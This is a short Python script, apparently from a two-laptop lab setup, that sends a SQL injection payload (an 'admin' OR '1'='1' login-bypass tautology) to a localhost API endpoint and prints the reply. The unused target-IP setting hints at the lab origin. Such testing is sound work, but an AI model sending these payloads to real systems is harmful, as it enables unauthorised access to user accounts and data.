import requests

# CONFIGURATION
TARGET_IP = "192.168.1.XX"  # <--- Update this to Laptop B's IP
URL = f"http://localhost:8000/api/ai/sql-injection" 

# Payload designed to return 'True' for any user
payload = {
    "query": "SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'x'"
}

def run_attack():
    print(f"[!] Launching SQL Injection on {URL}...")
    try:
        response = requests.post(URL, json=payload, timeout=5)
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Body: {response.text}")
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")

if __name__ == "__main__":
    run_attack()